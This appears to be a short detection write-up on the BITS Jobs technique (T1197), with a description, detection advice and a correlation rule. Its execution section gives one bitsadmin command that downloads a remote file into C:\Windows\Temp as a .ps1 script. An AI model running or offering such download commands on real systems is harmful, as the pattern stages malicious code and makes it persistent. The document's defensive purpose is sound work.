Technique Description: BITS Jobs (T1197)
------------------------------------
Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth used to transfer file through exposed Component Object Model (COM) [4]. BITS is used by updates, messengers and other applications preferred to operate in the background.

Assumptions 
-------------
We assume, BITS has been used to make malicious code persistent.  

Execution 
-------------
From cmd line: bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1

 Detection 
-------------

Monitor for BITSADMIN tool and event log for BITS activity. Look for things such as transfer, create and add file.

Visibility 
-------------
bitsadmin.exe

### Filter/ Correlation Rule ###

EventCode=4658 OR EventCode=1 AND bitsadmin

![bits](https://user-images.githubusercontent.com/32250546/55584236-c98bcc00-56f1-11e9-8153-cac3478ebc73.png)
